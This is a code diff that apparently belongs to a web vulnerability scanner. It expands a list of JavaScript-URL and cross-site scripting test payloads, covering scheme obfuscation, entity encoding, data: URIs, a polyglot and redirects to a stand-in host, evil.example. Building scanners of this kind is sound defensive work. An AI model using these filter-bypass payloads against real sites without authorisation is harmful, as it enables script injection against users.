@@ -15,10 +15,49 @@ from sentinelx.core.models import Finding, Evidence, raw_request, raw_response
 
 
 JS_PAYLOADS = [
+    # --- TECHNIQUE: javascript: scheme ---
     "javascript:alert(1)",
     "JaVaScRiPt:alert(1)",
+    "javascript:alert(1)//",
+    "   javascript:alert(1)",
+    "javascript&#58;alert(1)",
+    # --- TECHNIQUE: data: scheme ---
     "data:text/html,<script>alert(1)</script>",
     "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    "data:text/html,<svg onload=alert(1)>",
+    # --- TECHNIQUE: vbscript: (legacy IE) ---
+    "vbscript:msgbox(1)",
+    # --- TECHNIQUE: scheme confusion ---
+    "java\tscript:alert(1)",
+    "java\nscript:alert(1)",
+    "javascript&colon;alert(1)",
+    # --- TECHNIQUE: open redirect to JS execution ---
+    "//evil.example/x.js",
+    "https://evil.example/x.js",
+    # --- TECHNIQUE: DOM sink primitives ---
+    "'-alert(1)-'",
+    "\"><script>alert(1)</script>",
+    "</script><script>alert(1)</script>",
+    # --- TECHNIQUE: location assignment ---
+    "javascript:void(0)",
+    "javascript:/*-/*`/*\\`/*'/*\"/**/oNclick=alert(1)//",
+    # --- TECHNIQUE: unicode scheme ---
+    "\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:alert(1)",
+    # --- TECHNIQUE: meta refresh style ---
+    "0;url=javascript:alert(1)",
+    # --- TECHNIQUE: whitespace padding ---
+    "javascript\n:alert(1)",
+    "javascript\r:alert(1)",
+    # --- TECHNIQUE: null byte ---
+    "javascript\x00:alert(1)",
+    # --- TECHNIQUE: HTML5 entities ---
+    "javascript&colon;alert&lpar;1&rpar;",
+    # --- TECHNIQUE: fragment-only JS ---
+    "#javascript:alert(1)",
+    # --- TECHNIQUE: double scheme ---
+    "javascript:javascript:alert(1)",
+    # --- TECHNIQUE: case + tab ---
+    "JaVa\tScRiPt:alert(1)",
 ]
 
 REMEDIATION_JSREDIR = (
